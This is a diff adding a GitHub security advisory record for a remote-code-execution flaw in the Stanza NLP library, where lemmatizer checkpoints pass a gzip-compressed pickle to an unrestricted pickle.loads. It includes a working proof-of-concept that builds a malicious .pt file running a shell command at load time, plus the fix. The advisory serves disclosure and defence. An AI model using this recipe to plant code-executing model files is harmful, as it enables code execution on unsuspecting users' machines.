@@ -1,0 +1,60 @@
+{
+  "id": "GHSA-gh9r-c94j-cmp5",
+  "modified": "2026-11-03T20:45:05.204962616Z",
+  "published": "2026-11-03T20:29:16Z",
+  "aliases": [
+    "CVE-2026-115878"
+  ],
+  "summary": "Stanza: RCE via pickle deserialization in the lemmatizer",
+  "details": "## TL;DR\n\nLoading an attacker-supplied lemma `.pt` runs arbitrary code as the loading user. Since 1.14.0 the lemmatizer stores `pos_dict` as a gzip-compressed pickle in the checkpoint's `dicts` field (a `bytes` value). `torch.load(weights_only=True)` treats `bytes` as a primitive and passes it through unexamined, so its allowlist never sees the inner stream. `Trainer.load` then feeds those bytes to an **unrestricted `pickle.loads`**: the only bare `pickle.loads` in the tree. Result: `weights_only=True` gives no protection here, and model loading executes code.\n\nConfirmed end-to-end against stanza 1.14.0 / PyTorch 2.13.0 / CPython 3.13.7: a crafted checkpoint whose payload `__reduce__` returns `(os.system, (cmd,))` ran the command at load time (marker file showed `uid=501(...)`, `executed_by=...`).\n\nA downstream user is vulnerable whenever they build a pipeline that loads a caller-supplied lemmatizer checkpoint. i.e. `stanza.Pipeline(lang=..., processors=\"tokenize,pos,lemma\", lemma_model_path=\"\u003cattacker-influenced .pt\u003e\")` (or any equivalent load of an untrusted/shared lemma model through a custom registry) - since that call routes straight into `Trainer.load` -\u003e `_unpack_pos_dict` and executes the embedded pickle at construction time.\n\n## The vulnerable path\n\n`stanza/models/lemma/trainer.py`:\n\n```python\n# _pack_pos_dict (write side): pos_dict -\u003e pickle -\u003e gzip -\u003e bytes, stored under checkpoint['dicts']\n\ndef _unpack_pos_dict(data):                 # line 54\n    buf = io.BytesIO(data)\n    with gzip.GzipFile(fileobj=buf, mode=\"rb\") as gz:\n        raw = gz.read()\n    return pickle.loads(raw)                # \u003c-- unrestricted default unpickler\n```\n\n```python\ndef load(self, filename, ...):              # line 365\n    checkpoint = torch.load(filename, ..., weights_only=True)   # outer allowlist; bytes pass through intact\n    ...\n    if dicts_version == _DICTS_VERSION_POS:                     # dicts_version == 2 (current format)\n        self.pos_dict = _unpack_pos_dict(checkpoint['dicts'])   # line 378, no validation\n```\n\n**Reachable from the documented API.** `stanza.Pipeline(..., lemma_model_path=\u003cfile\u003e)` -\u003e `LemmaProcessor._set_up_model` -\u003e `Trainer(model_file=…)` -\u003e `Trainer.load`. Any shared/distributed checkpoint, custom registry, or caller-supplied `lemma_model_path` reaches it. No checksum is applied to caller-supplied paths (MD5 verification exists only in the default registry download flow). Trigger is at pipeline construction, before any inference input is processed.\n\nNote: this is **not** the `weights_only=False` fallback fixed under CVE-2026-54499: the outer load stays safe; the exposure is entirely the inner pickle.\n\n## Minimal PoC\n\n```python\nimport gzip, io, os, pickle, tempfile, torch\nfrom stanza.models.lemma.trainer import _unpack_pos_dict, _DICTS_VERSION_POS\n\nMARKER = os.path.join(tempfile.gettempdir(), \"stanza_lemma_poc_pwned\")\n\nclass Payload:\n    def __reduce__(self):\n        return (os.system, (\"id \u003e %s 2\u003e\u00261; echo executed_by=$(whoami) \u003e\u003e %s\" % (MARKER, MARKER),))\n\nbuf = io.BytesIO()\nwith gzip.GzipFile(fileobj=buf, mode=\"wb\") as gz:        # same shape as _pack_pos_dict()\n    gz.write(pickle.dumps(Payload(), protocol=4))\n\nckpt = {\"dicts\": buf.getvalue(), \"dicts_version\": _DICTS_VERSION_POS}\npt = os.path.join(tempfile.gettempdir(), \"evil_lemma.pt\")\ntorch.save(ckpt, pt, _use_new_zipfile_serialization=False)\n\nloaded = torch.load(pt, lambda s, l: s, weights_only=True)   # SUCCEEDS; dicts is bytes, intact\n_unpack_pos_dict(loaded[\"dicts\"])                            # == trainer.py:378 -\u003e command runs\nprint(\"pwned:\", open(MARKER).read().strip())\n```\n\nThe PoC calls `_unpack_pos_dict` directly: the exact expression at `trainer.py:378`. Reaching it through `stanza.Pipeline(...)` additionally requires the crafted file to carry a well-formed `config`/`vocab` so `load` runs to line 378 (established by source review); the deserialization to execution step is confirmed at runtime.\n\n## Fix\n\nDeserialize the inner stream with the `RestrictedUnpickler` the project already uses in `stanza/models/common/doc.py` (allowlists `tuple`/`list`/`dict` only):\n\n```python\nfrom stanza.models.common.doc import RestrictedUnpickler\n\ndef _unpack_pos_dict(data):\n    buf = io.BytesIO(data)\n    with gzip.GzipFile(fileobj=buf, mode=\"rb\") as gz:\n        raw = gz.read()\n    return RestrictedUnpickler(io.BytesIO(raw)).load()\n```\n\nA legitimate `pos_dict` is a nested `{pos: {word: lemma}}` string mapping no class/function globals, so it loads cleanly, while any `os.system`-style payload is rejected by `find_class`. JSON would work equally well (all keys/values are strings) and remove pickle from this path entirely. Apply to both `_unpack_pos_dict` and, for forward compatibility, `_pack_pos_dict`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "stanza",
+        "purl": "pkg:pypi/stanza"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.14.0"
+            },
+            {
+              "fixed": "1.15.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.14.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-gh9r-c94j-cmp5/GHSA-gh9r-c94j-cmp5.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/stanfordnlp/stanza/security/advisories/GHSA-gh9r-c94j-cmp5"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/stanfordnlp/stanza/pull/1649"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/stanfordnlp/stanza/commit/b21e1c9b47b4fccff21d3b0a6c0687a19410c2f0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/stanfordnlp/stanza"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/stanfordnlp/stanza/releases/tag/v1.15.0"
+    }
+  ]
+}
